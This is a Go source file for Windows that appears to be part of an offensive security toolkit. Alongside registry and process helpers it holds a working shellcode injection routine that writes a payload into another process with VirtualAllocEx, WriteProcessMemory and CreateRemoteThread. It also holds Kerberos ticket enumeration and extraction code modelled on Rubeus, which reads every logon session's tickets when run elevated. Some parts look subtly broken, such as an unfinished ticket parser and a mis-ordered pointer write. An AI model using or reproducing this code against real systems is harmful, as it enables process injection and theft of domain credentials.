//go:build windows
// +build windows

package windows

import (
	"errors"
	"fmt"
	win "golang.org/x/sys/windows"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"github.com/mitchellh/go-ps"
	"golang.org/x/sys/win/registry"
)

const (
	MEM_COMMIT                = 0x1000
	MEM_RESERVE               = 0x2000
	PAGE_EXECUTE_READWRITE    = 0x40
	PROCESS_CREATE_THREAD     = 0x0002
	PROCESS_QUERY_INFORMATION = 0x0400
	PROCESS_VM_OPERATION      = 0x0008
	PROCESS_VM_WRITE          = 0x0020
	PROCESS_VM_READ           = 0x0010
)

// enums
type PrincipalName uint
type LogonType uint32
type TicketFlags uint32
type KerbProtocolMessageType uint32

const (
	NT_UNKNOWN        PrincipalName = iota
	NT_PRINCIPAL      PrincipalName = iota
	NT_SRV_INST       PrincipalName = iota
	NT_SRV_HST        PrincipalName = iota
	NT_SRV_XHST       PrincipalName = iota
	NT_UID            PrincipalName = iota
	NT_X500_PRINCIPAL PrincipalName = iota
	NT_SMTP_NAME      PrincipalName = iota
	NT_ENTERPRISE     PrincipalName = iota
)

const (
	LOGON32_LOGON_INTERACTIVE       LogonType = 2
	LOGON32_LOGON_NETWORK           LogonType = 3
	LOGON32_LOGON_BATCH             LogonType = 4
	LOGON32_LOGON_SERVICE           LogonType = 5
	LOGON32_LOGON_UNLOCK            LogonType = 7
	LOGON32_LOGON_NETWORK_CLEARTEXT LogonType = 8
	LOGON32_LOGON_NEW_CREDENTIALS   LogonType = 9
)

const (
	TicketReserved         TicketFlags = 0x80000000
	TicketForwardable      TicketFlags = 0x40000000
	TicketForwarded        TicketFlags = 0x20000000
	TicketProxiable        TicketFlags = 0x10000000
	TicketProxy            TicketFlags = 0x08000000
	TicketMayPostdate      TicketFlags = 0x04000000
	TicketPostdated        TicketFlags = 0x02000000
	TicketInvalid          TicketFlags = 0x01000000
	TicketRenewable        TicketFlags = 0x00800000
	TicketInitial          TicketFlags = 0x00400000
	TicketPreAuthent       TicketFlags = 0x00200000
	TicketHWAuthent        TicketFlags = 0x00100000
	TicketOkAsDelegate     TicketFlags = 0x00040000
	TicketAnonymous        TicketFlags = 0x00020000
	TicketNameCanonicalize TicketFlags = 0x00010000
)

// TicketFlags string definition
func (t TicketFlags) String() string {
	var flags []string

	flagMap := map[TicketFlags]string{
		TicketReserved:         "reserved",
		TicketForwardable:      "forwardable",
		TicketForwarded:        "forwarded",
		TicketProxiable:        "proxiable",
		TicketProxy:            "proxy",
		TicketMayPostdate:      "may_postdate",
		TicketPostdated:        "postdated",
		TicketInvalid:          "invalid",
		TicketRenewable:        "renewable",
		TicketInitial:          "initial",
		TicketPreAuthent:       "pre_authent",
		TicketHWAuthent:        "hw_authent",
		TicketOkAsDelegate:     "ok_as_delegate",
		TicketAnonymous:        "anonymous",
		TicketNameCanonicalize: "name_canonicalize",
	}

	for flag, name := range flagMap {
		if t&flag != 0 {
			flags = append(flags, name)
		}
	}

	if len(flags) == 0 {
		return "empty"
	}

	return strings.Join(flags, ", ")
}

const (
	KerbQueryTicketCacheExMessage    KerbProtocolMessageType = 14
	KerbRetrieveEncodedTicketMessage KerbProtocolMessageType = 8
)

type KrbCred struct {
	Pvno    uint
	MsgType uint
	Tickets []Ticket
	EncPart EncKrbCredPart
}

type SessionCred struct {
	LogonSession LogonSessionData
	Tickets      []KrbTicket
}

type KrbTicket struct {
	StartTime      time.Time
	EndTime        time.Time
	RenewTime      time.Time
	TicketFlags    TicketFlags
	EncryptionType int32
	ServerName     string
	ServerRealm    string
	ClientName     string
	ClientRealm    string
	KrbCred        *KrbCred
}

type Ticket struct {
}

type EncKrbCredPart struct {
	ticketInfo []KrbCredInfo
}

type KrbCredInfo struct {
	key       *EncryptionKey
	pRealm    string
	pName     *PrincipalNameData
	flags     uint32
	authTime  string
	startTime string
	endTime   string
	renewTill string
	sRealm    string
	sName     *PrincipalNameData
	cAddr     *HostAddresses
}

type TokenStatistics struct {
	TokenID            win.LUID
	AuthenticationId   win.LUID
	ExpirationTime     int64
	TokenType          uint32
	ImpersonationLevel uint32
	DynamicCharged     uint32
	DynamicAvailable   uint32
	GroupCount         uint32
	PrivilegeCount     uint32
	ModifiedId         win.LUID
}

type SecurityLogonSessionData struct {
	Size                  uint32
	LoginID               win.LUID
	Username              LsaString
	LoginDomain           LsaString
	AuthenticationPackage LsaString
	LogonType             uint32
	Session               uint32
	PSiD                  uintptr
	LoginTime             uint64
	LogonServer           LsaString
	DnsDomainName         LsaString
	Upn                   LsaString
}

type PrincipalNameData struct {
	nameType   PrincipalName
	nameString []string
}

type EncryptionKey struct {
	keyType  int32
	keyValue []byte
}

type HostAddresses []HostAddress

type HostAddress struct {
	addrType    int32
	addressData []byte
}

type LsaString struct {
	Length        uint16
	MaximumLength uint16
	Buffer        uintptr
}

type LogonSessionData struct {
	LogonID               win.LUID
	Username              string
	LogonDomain           string
	AuthenticationPackage string
	LogonType             LogonType
	Session               int32
	Sid                   *win.SID
	LogonTime             time.Time
	LogonServer           string
	DnsDomainName         string
	Upn                   string
}

type KerbQueryTktCacheRequest struct {
	MessageType KerbProtocolMessageType
	_           uint32
	LogonId     win.LUID
}

type QueryTktCacheResponse struct {
	MessageType    KerbProtocolMessageType
	CountOfTickets uint32
	Tickets        [1]KerbTicketCacheInfoEx
}

type KerbTicketCacheInfoEx struct {
	ClientName     LsaString
	ClientRealm    LsaString
	ServerName     LsaString
	ServerRealm    LsaString
	StartTime      int64
	EndTime        int64
	RenewTime      int64
	EncryptionType int32
	TicketFlags    uint32
}

type KerbRetrieveTktRequest struct {
	MessageType    KerbProtocolMessageType
	_              uint32
	LogonId        win.LUID
	TicketFlags    uint32
	CacheOptions   uint32
	EncryptionType int64
	TargetName     LsaString
}

type KerbRetrieveTktResponse struct {
	MessageType KerbProtocolMessageType
	Ticket      KerbExternalTicket
}

type KerbExternalTicket struct {
	ServiceName         LsaString
	TargetName          LsaString
	ClientName          LsaString
	DomainName          LsaString
	TargetDomainName    LsaString
	AltTargetDomainName LsaString
	SessionKey          KerbCryptoKey
	TicketFlags         uint32
	Flags               uint32
	KeyExpirationTime   int64
	StartTime           int64
	EndTime             int64
	RenewUntil          int64
	TimeSkew            int64
	EncodedTicketSize   int32
	EncodedTicket       uintptr
}

type KerbCryptoKey struct {
	KeyType int32
	Length  int32
	Value   uintptr
}

// kerberos globals
const (
	KerbRetrieveTicketAsKerbCred = 0x8
)

// dll imports
var (
	secur32                        = win.NewLazyDLL("secur32.dll")
	LsaConnectUntrusted            = secur32.NewProc("LsaConnectUntrusted")
	LsaLookupAuthenticationPackage = secur32.NewProc("LsaLookupAuthenticationPackage")
	LsaCallAuthenticationPackage   = secur32.NewProc("LsaCallAuthenticationPackage")
	LsaGetLogonSessionData         = secur32.NewProc("LsaGetLogonSessionData")
	LsaFreeReturnBuffer            = secur32.NewProc("LsaFreeReturnBuffer")
	LsaEnumerateLogonSessions      = secur32.NewProc("LsaEnumerateLogonSessions")
)

var (
	// registry globals
	regKeys = map[string]registry.Key{
		"CLASSES_ROOT":     registry.CLASSES_ROOT,
		"CURRENT_USER":     registry.CURRENT_USER,
		"LOCAL_MACHINE":    registry.LOCAL_MACHINE,
		"USERS":            registry.USERS,
		"CURRENT_CONFIG":   registry.CURRENT_CONFIG,
		"PERFORMANCE_DATA": registry.PERFORMANCE_DATA,
	}
)

type RegistryRetValue struct {
	ValType        string   `json:"return_type"`
	StringVal      string   `json:"string_val"`
	StringArrayVal []string `json:"string_array_val"`
	ByteArrayVal   []byte   `json:"byte_array_val"`
	IntVal         uint32   `json:"int_val"`
	LongVal        uint64   `json:"long_val"`
}

const (
	winToUnixEpochIntervals = 116444736000000000
)

/*
registry helper funcs
*/
func lookUpKey(keyString string) (registry.Key, error) {
	key, ok := regKeys[keyString]
	if !ok {
		// lol, picking a key at random because fuck golang return types
		return registry.CLASSES_ROOT, errors.New("Registry key " + keyString + " not found")
	}
	return key, nil
}

/*
misc helper funcs
*/
func fileTimeToTime(fileTime int64) time.Time {
	nsec := (fileTime - winToUnixEpochIntervals) * 100
	return time.Unix(0, nsec).Local()
}

/*
kerberos helper funcs
*/
func newKRBCred() *KrbCred {
	return &KrbCred{
		Pvno:    5,
		MsgType: 22,
		Tickets: []Ticket{},
		EncPart: EncKrbCredPart{
			ticketInfo: []KrbCredInfo{},
		},
	}
}

func lsaStrToString(s LsaString) string {
	if s.Length == 0 {
		return ""
	}
	buf := make([]uint16, s.Length/2)
	copy(buf, (*[1 << 30]uint16)(unsafe.Pointer(s.Buffer))[:s.Length/2])
	return win.UTF16ToString(buf)
}

func enumerateLogonSessions() ([]win.LUID, error) {
	var count uint32
	var luids uintptr

	ret, _, _ := LsaEnumerateLogonSessions.Call(
		uintptr(unsafe.Pointer(&count)),
		uintptr(unsafe.Pointer(&luids)),
	)

	if ret != 0 {
		return nil, fmt.Errorf("LsaEnumerateLogonSessions failed with error: 0x%x", ret)
	}

	luidSlice := make([]win.LUID, count)
	for i := uint32(0); i < count; i++ {
		luid := (*win.LUID)(unsafe.Pointer(luids + uintptr(i)*unsafe.Sizeof(win.LUID{})))
		luidSlice[i] = *luid
	}

	defer LsaFreeReturnBuffer.Call(luids)

	return luidSlice, nil
}

func getCurrentLUID() (win.LUID, error) {
	var currentToken win.Token
	err := win.OpenProcessToken(win.CurrentProcess(), win.TOKEN_QUERY, &currentToken)
	if err != nil {
		return win.LUID{}, fmt.Errorf("OpenProcessToken failed with error: %v", err)
	}
	defer currentToken.Close()

	var tokenStats TokenStatistics
	var returnLength uint32

	err = win.GetTokenInformation(currentToken, win.TokenStatistics, (*byte)(unsafe.Pointer(&tokenStats)), uint32(unsafe.Sizeof(tokenStats)), &returnLength)
	if err != nil {
		return win.LUID{}, fmt.Errorf("GetTokenInformation failed with error: %v", err)
	}

	return tokenStats.AuthenticationId, nil
}

func getLogonSessionData(luid win.LUID) (*LogonSessionData, error) {
	var sessionDataPtr uintptr

	ret, _, _ := LsaGetLogonSessionData.Call(
		uintptr(unsafe.Pointer(&luid)),
		uintptr(unsafe.Pointer(&sessionDataPtr)),
	)

	if ret != 0 {
		return nil, fmt.Errorf("LsaGetLogonSessionData failed with error: 0x%x", ret)
	}

	defer LsaFreeReturnBuffer.Call(sessionDataPtr)

	sessionData := (*SecurityLogonSessionData)(unsafe.Pointer(sessionDataPtr))

	result := &LogonSessionData{
		LogonID:               sessionData.LoginID,
		Username:              lsaStrToString(sessionData.Username),
		LogonDomain:           lsaStrToString(sessionData.LoginDomain),
		AuthenticationPackage: lsaStrToString(sessionData.AuthenticationPackage),
		LogonType:             LogonType(sessionData.LogonType),
		Session:               int32(sessionData.Session),
		LogonTime:             time.Unix(0, int64(sessionData.LoginTime)*100),
		LogonServer:           lsaStrToString(sessionData.LogonServer),
		DnsDomainName:         lsaStrToString(sessionData.DnsDomainName),
		Upn:                   lsaStrToString(sessionData.Upn),
	}

	if sessionData.PSiD != 0 {
		var sidStr *uint16
		err := win.ConvertSidToStringSid((*win.SID)(unsafe.Pointer(sessionData.PSiD)), &sidStr)
		if err == nil {
			result.Sid, _ = win.StringToSid(win.UTF16PtrToString(sidStr))
			win.LocalFree(win.Handle(unsafe.Pointer(sidStr)))
		}
	}

	return result, nil
}

func isAdmin() (bool, error) {
	var token win.Token
	process, err := win.GetCurrentProcess()
	if err != nil {
		return false, fmt.Errorf("GetCurrentProcess failed with error: %v", err)
	}

	err = win.OpenProcessToken(process, win.TOKEN_QUERY, &token)
	if err != nil {
		return false, fmt.Errorf("OpenProcessToken failed with error: %v", err)
	}
	defer token.Close()

	var elevated uint32
	var size uint32
	err = win.GetTokenInformation(token, win.TokenElevation, (*byte)(unsafe.Pointer(&elevated)), uint32(unsafe.Sizeof(elevated)), &size)
	if err != nil {
		return false, fmt.Errorf("GetTokenInformation failed with error: %v", err)
	}

	return elevated != 0, nil
}

/*
public funcs
*/
//AddRegKeyString Adds a registry key of type "string".
func AddRegKeyString(registryString string, path string, name string, value string) error {
	regKey, err := lookUpKey(registryString)
	if err != nil {
		return err
	}
	openRegKey, _, err := registry.CreateKey(regKey, path, registry.SET_VALUE)
	if err != nil {
		return err
	}
	defer openRegKey.Close()
	return openRegKey.SetStringValue(name, value)
}

// AddRegKeyExpandedString Adds a registry key of type "expanded string".
func AddRegKeyExpandedString(registryString string, path string, name string, value string) error {
	regKey, err := lookUpKey(registryString)
	if err != nil {
		return err
	}
	openRegKey, _, err := registry.CreateKey(regKey, path, registry.SET_VALUE)
	if err != nil {
		return err
	}
	defer openRegKey.Close()
	return openRegKey.SetExpandStringValue(name, value)
}

// AddRegKeyBinary Adds a registry key of type "binary".
func AddRegKeyBinary(registryString string, path string, name string, value []byte) error {
	regKey, err := lookUpKey(registryString)
	if err != nil {
		return err
	}
	openRegKey, _, err := registry.CreateKey(regKey, path, registry.SET_VALUE)
	if err != nil {
		return err
	}
	defer openRegKey.Close()
	return openRegKey.SetBinaryValue(name, value)
}

// AddRegKeyDWORD Adds a registry key of type DWORD.
func AddRegKeyDWORD(registryString string, path string, name string, value int64) error {
	var uval uint32
	uval = uint32(value)
	regKey, err := lookUpKey(registryString)
	if err != nil {
		return err
	}
	openRegKey, _, err := registry.CreateKey(regKey, path, registry.SET_VALUE)
	if err != nil {
		return err
	}
	defer openRegKey.Close()
	return openRegKey.SetDWordValue(name, uval)
}

// AddRegKeyQWORD Adds a registry key of type QDWORD.
func AddRegKeyQWORD(registryString string, path string, name string, value int64) error {
	var uval uint64
	uval = uint64(value)
	regKey, err := lookUpKey(registryString)
	if err != nil {
		return err
	}
	openRegKey, _, err := registry.CreateKey(regKey, path, registry.SET_VALUE)
	if err != nil {
		return err
	}
	defer openRegKey.Close()
	return openRegKey.SetQWordValue(name, uval)
}

// AddRegKeyStrings Adds a registry key of type "strings".
func AddRegKeyStrings(registryString string, path string, name string, value []string) error {
	regKey, err := lookUpKey(registryString)
	if err != nil {
		return err
	}
	openRegKey, _, err := registry.CreateKey(regKey, path, registry.SET_VALUE)
	if err != nil {
		return err
	}
	defer openRegKey.Close()
	return openRegKey.SetStringsValue(name, value)
}

// DelRegKey Removes a key from the registry.
func DelRegKey(registryString string, path string) error {
	regKey, err := lookUpKey(registryString)
	if err != nil {
		return err
	}
	return registry.DeleteKey(regKey, path)
}

// DelRegKeyValue Removes the value of a key from the registry.
func DelRegKeyValue(registryString string, path string, valueName string) error {
	regKey, err := lookUpKey(registryString)
	if err != nil {
		return err
	}
	openRegKey, _, err := registry.CreateKey(regKey, path, registry.SET_VALUE)
	openRegKey.DeleteValue(valueName)
	openRegKey.Close()
	return nil
}

// QueryRegKey Retrives a registry key's value.
func QueryRegKey(registryString string, path string, key string) (RegistryRetValue, error) {
	retVal := RegistryRetValue{}
	regKey, err := lookUpKey(registryString)
	if err != nil {
		return retVal, err
	}
	openRegKey, err := registry.OpenKey(regKey, path, registry.QUERY_VALUE)
	if err != nil {
		return retVal, err
	}
	_, valType, err := openRegKey.GetValue(key, nil)
	if err != nil {
		return retVal, err
	}
	switch valType {
	case registry.EXPAND_SZ:
		value, _, err := openRegKey.GetStringsValue(key)
		if err != nil {
			return retVal, err
		}
		retVal.ValType = "StringArray"
		retVal.StringArrayVal = value
	case registry.SZ:
		value, _, err := openRegKey.GetStringValue(key)
		if err != nil {
			return retVal, err
		}
		retVal.ValType = "String"
		retVal.StringVal = value
	case registry.BINARY:
		value, _, err := openRegKey.GetBinaryValue(key)
		if err != nil {
			return retVal, err
		}
		retVal.ValType = "ByteArray"
		retVal.ByteArrayVal = value
	case registry.DWORD:
		value, _, err := openRegKey.GetIntegerValue(key)
		if err != nil {
			return retVal, err
		}
		retVal.ValType = "Uint"
		retVal.IntVal = uint32(value)
	case registry.QWORD:
		value, _, err := openRegKey.GetIntegerValue(key)
		if err != nil {
			return retVal, err
		}
		retVal.ValType = "Uint64"
		retVal.LongVal = value
	}
	return retVal, nil
}

// FindPid returns the PID of a running proccess as an int.
func FindPid(procName string) (int, error) {
	procs, err := ps.Processes()
	if err != nil {
		return 0, err
	}
	for _, proc := range procs {
		if proc.Executable() == procName {
			return proc.Pid(), nil
		}
	}
	return 0, errors.New(procName + " PID not found!")
}

// GetRunningCount returns the number of copies of a process running as an int.
func GetRunningCount(procName string) (int, error) {
	procs, err := ps.Processes()
	if err != nil {
		return 0, err
	}
	var procCount = 0
	for _, proc := range procs {
		if proc.Executable() == procName {
			procCount += 1
		}
	}
	if procCount == 0 {
		return 0, errors.New(procName + " is not running!")
	} else {
		return procCount, nil
	}
}

// InjectShellcode Injects shellcode into a running process.
func InjectShellcode(pid_int int, payload []byte) error {

	pid := float64(pid_int)

	// custom functions
	checkErr := func(err error) bool {
		if err.Error() != "The operation completed successfully." {
			return true
		}
		return false
	}

	// init
	kernel, err := syscall.LoadDLL("kernel32.dll")
	if err != nil {
		return err
	}
	openProc, err := kernel.FindProc("OpenProcess")
	if err != nil {
		return err
	}
	writeProc, err := kernel.FindProc("WriteProcessMemory")
	if err != nil {
		return err
	}
	allocExMem, err := kernel.FindProc("VirtualAllocEx")
	if err != nil {
		return err
	}
	createThread, err := kernel.FindProc("CreateRemoteThread")
	if err != nil {
		return err
	}

	// open remote process
	remoteProc, _, err := openProc.Call(
		PROCESS_CREATE_THREAD|PROCESS_QUERY_INFORMATION|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_VM_READ,
		uintptr(0),
		uintptr(int(pid)),
	)
	if remoteProc != 0 {
		if checkErr(err) {
			return err
		}
	}

	// allocate memory in remote process
	remoteMem, _, err := allocExMem.Call(
		remoteProc,
		uintptr(0),
		uintptr(len(payload)),
		MEM_RESERVE|MEM_COMMIT,
		PAGE_EXECUTE_READWRITE,
	)
	if remoteMem != 0 {
		if checkErr(err) {
			return err
		}
	}

	// write shellcode to the allocated memory within the remote process
	writeProcRetVal, _, err := writeProc.Call(
		remoteProc,
		remoteMem,
		uintptr(unsafe.Pointer(&payload[0])),
		uintptr(len(payload)),
		uintptr(0),
	)
	if writeProcRetVal == 0 {
		if checkErr(err) {
			return err
		}
	}

	// GO!
	status, _, _ := createThread.Call(
		remoteProc,
		uintptr(0),
		0,
		remoteMem,
		uintptr(0),
		0,
		uintptr(0),
	)
	if status == 0 {
		return errors.New("could not inject into given process")
	}

	// all good!
	return nil
}

func NewLSAString(s string) *LsaString {
	bytes := []byte(s)
	return &LsaString{
		Length:        uint16(len(bytes)),
		MaximumLength: uint16(len(bytes)),
		Buffer:        uintptr(unsafe.Pointer(&bytes[0])),
	}
}

func ExtractTicket(lsaHandle win.Handle, authPackage uint32, luid win.LUID, targetName string) (*KrbCred, error) {
	if lsaHandle == 0 {
		return nil, fmt.Errorf("invalid LSA handle")
	}

	request := KerbRetrieveTktRequest{
		MessageType:    KerbRetrieveEncodedTicketMessage,
		LogonId:        luid,
		TicketFlags:    0,
		CacheOptions:   KerbRetrieveTicketAsKerbCred,
		EncryptionType: 0,
	}

	utf16Bytes := win.StringToUTF16(targetName)
	length := uint16(len(targetName) * 2)
	maxLength := length + 2

	structSize := unsafe.Sizeof(request)
	totalSize := structSize + uintptr(maxLength)

	buffer := make([]byte, totalSize)
	bufferPtr := unsafe.Pointer(&buffer[0])

	*(*KerbRetrieveTktRequest)(bufferPtr) = request

	var targetNamePtr uintptr
	targetNamePtrOffset := uintptr(24) // for 64-bit
	if unsafe.Sizeof(uintptr(0)) == 4 {
		targetNamePtrOffset = uintptr(16) // for 32-bit
	}
	*(*uintptr)(unsafe.Pointer(uintptr(bufferPtr) + targetNamePtrOffset)) = targetNamePtr

	targetNamePtr = uintptr(bufferPtr) + structSize
	copy((*[1 << 30]byte)(unsafe.Pointer(targetNamePtr))[:maxLength],
		unsafe.Slice((*byte)(unsafe.Pointer(&utf16Bytes[0])), maxLength))

	requestPtr := (*KerbRetrieveTktRequest)(bufferPtr)
	requestPtr.TargetName = LsaString{
		Length:        length,
		MaximumLength: maxLength,
		Buffer:        targetNamePtr,
	}

	var responsePtr uintptr
	var returnLength uint32
	var protocolStatus uint32

	ret, _, _ := LsaCallAuthenticationPackage.Call(
		uintptr(lsaHandle),
		uintptr(authPackage),
		uintptr(bufferPtr),
		uintptr(totalSize),
		uintptr(unsafe.Pointer(&responsePtr)),
		uintptr(unsafe.Pointer(&returnLength)),
		uintptr(unsafe.Pointer(&protocolStatus)),
	)

	if ret != 0 {
		return nil, fmt.Errorf("LsaCallAuthenticationPackage failed: 0x%x", ret)
	}

	if protocolStatus != 0 {
		return nil, fmt.Errorf("protocol status error: 0x%x", protocolStatus)
	}

	if responsePtr != 0 {
		defer LsaFreeReturnBuffer.Call(responsePtr)

		response := (*KerbRetrieveTktResponse)(unsafe.Pointer(responsePtr))
		encodedTicketSize := response.Ticket.EncodedTicketSize

		if encodedTicketSize > 0 {
			encodedTicket := make([]byte, encodedTicketSize)
			copy(encodedTicket,
				(*[1 << 30]byte)(unsafe.Pointer(response.Ticket.EncodedTicket))[:encodedTicketSize])

			krbCred := newKRBCred()
			// TODO: Parse encodedTicket into krbCred ASN.1 structure

			return krbCred, nil
		}
	}

	return nil, fmt.Errorf("KRB_RETRIEVE_TKT_RESPONSE failed")
}

func EnumerateTickets(lsaHandle win.Handle, authPackage uint32) ([]SessionCred, error) {
	var luids []win.LUID
	var sessionCreds []SessionCred
	isAdmin, err := isAdmin()
	if err != nil {
		return sessionCreds, fmt.Errorf("[-] failed to check if admin is enabled, err: %v\n", err)
	}
	if isAdmin {
		fmt.Printf("[!] elevated token. listing sessionCreds for all users\n\n")
		luids, err = enumerateLogonSessions()
		if err != nil {
			return sessionCreds, fmt.Errorf("[-] failed to enumerate logon ids, err: %v\n", err)
		}
	} else {
		fmt.Printf("[-] low priv token. listing sessionCreds for current user\n\n")
		luid, err := getCurrentLUID()
		if err != nil {
			return sessionCreds, fmt.Errorf("[-] failed to get current luid, err: %v\n", err)
		}
		luids = append(luids, luid)
	}

	for _, luid := range luids {
		value := uint64(luid.HighPart)<<32 | uint64(luid.LowPart)
		fmt.Printf("[+] current luid: 0x%x\n", value)

		sessionData, err := getLogonSessionData(luid)
		if err != nil {
			return sessionCreds, fmt.Errorf("[-] failed to get logon session data, err: %v\n", err)
		}

		var sessionCred SessionCred
		sessionCred.LogonSession = *sessionData
		sessionCred.Tickets = []KrbTicket{}

		var responsePtr uintptr
		pResponsePtr := unsafe.Pointer(&responsePtr)
		var returnLength = 0
		var protocolStatus = 0

		var ticketCacheRequest KerbQueryTktCacheRequest
		ticketCacheRequest.MessageType = KerbQueryTicketCacheExMessage

		if isAdmin {
			ticketCacheRequest.LogonId = sessionData.LogonID
		} else {
			// https://github.com/GhostPack/Rubeus/blob/master/Rubeus/lib/LSA.cs#L303
			ticketCacheRequest.LogonId = win.LUID{LowPart: 0, HighPart: 0}
		}

		ret, _, err := LsaCallAuthenticationPackage.Call(
			uintptr(lsaHandle),
			uintptr(authPackage),
			uintptr(unsafe.Pointer(&ticketCacheRequest)),
			uintptr(unsafe.Sizeof(ticketCacheRequest)),
			uintptr(pResponsePtr),
			uintptr(unsafe.Pointer(&returnLength)),
			uintptr(unsafe.Pointer(&protocolStatus)),
		)
		if ret != 0 {
			return sessionCreds, fmt.Errorf("[-] LsaCallAuthenticationPackage failed, err: %v\n", err)
		}

		if responsePtr != 0 {
			defer LsaFreeReturnBuffer.Call(responsePtr)

			response := (*QueryTktCacheResponse)(unsafe.Pointer(responsePtr))

			if response.CountOfTickets > 0 {
				ticketSize := unsafe.Sizeof(KerbTicketCacheInfoEx{})

				for i := uint32(0); i < response.CountOfTickets; i++ {
					currentTicketPtr := responsePtr + 8 + uintptr(i)*ticketSize
					ticketInfo := (*KerbTicketCacheInfoEx)(unsafe.Pointer(currentTicketPtr))

					ticket := &KrbTicket{
						StartTime:      fileTimeToTime(ticketInfo.StartTime),
						EndTime:        fileTimeToTime(ticketInfo.EndTime),
						RenewTime:      fileTimeToTime(ticketInfo.RenewTime),
						TicketFlags:    TicketFlags(ticketInfo.TicketFlags),
						EncryptionType: ticketInfo.EncryptionType,
						ServerName:     lsaStrToString(ticketInfo.ServerName),
						ServerRealm:    lsaStrToString(ticketInfo.ServerRealm),
						ClientName:     lsaStrToString(ticketInfo.ClientName),
						ClientRealm:    lsaStrToString(ticketInfo.ClientRealm),
					}

					sessionCred.Tickets = append(sessionCred.Tickets, *ticket)
				}
			}
		}
		sessionCreds = append(sessionCreds, sessionCred)
	}

	return sessionCreds, nil
}

func DisplayTickets(sessionCreds []SessionCred) {
	for _, sessionCred := range sessionCreds {
		fmt.Printf("  username: %s\n", sessionCred.LogonSession.Username)
		fmt.Printf("  domain: %s\n", sessionCred.LogonSession.LogonDomain)
		fmt.Printf("  logon id: 0x%x\n", sessionCred.LogonSession.LogonID.LowPart)
		fmt.Printf("  sid: %s\n", sessionCred.LogonSession.Sid)
		fmt.Printf("  authentication package: %s\n", sessionCred.LogonSession.AuthenticationPackage)
		fmt.Printf("  logon type: %v\n", sessionCred.LogonSession.LogonType)
		fmt.Printf("  lgoon time: %v\n", sessionCred.LogonSession.LogonTime)
		fmt.Printf("  logon type: %s\n", sessionCred.LogonSession.LogonServer)
		fmt.Printf("  logon type: %s\n\n", sessionCred.LogonSession.DnsDomainName)

		for i, ticket := range sessionCred.Tickets {
			fmt.Printf("    [%d]\n", i)
			fmt.Printf("      start/end/maxrenew: %v ; %v ; %v\n", ticket.StartTime, ticket.EndTime, ticket.RenewTime)
			fmt.Printf("      server name: %s\n", ticket.ServerName)
			fmt.Printf("      client name: %s\n", ticket.ClientName)
			fmt.Printf("      flags: %s\n", ticket.TicketFlags.String())
		}
	}
}

func GetLsaHandle() (win.Handle, error) {
	var lsaHandle win.Handle
	ret, _, err := LsaConnectUntrusted.Call(
		uintptr(unsafe.Pointer(&lsaHandle)),
	)
	if ret != 0 {
		return lsaHandle, fmt.Errorf("LsaConnectUntrusted failed with error: %v", err)
	}

	return lsaHandle, nil
}

func GetAuthenticationPackage(lsaHandle win.Handle, lsaString *LsaString) (uint32, error) {
	var authPackage uint32

	ret, _, err := LsaLookupAuthenticationPackage.Call(
		uintptr(lsaHandle),
		uintptr(unsafe.Pointer(lsaString)),
		uintptr(unsafe.Pointer(&authPackage)),
	)
	if ret != 0 {
		return authPackage, fmt.Errorf("LsaLookupAuthenticationPackage failed: %v", err)
	}

	return authPackage, nil
}
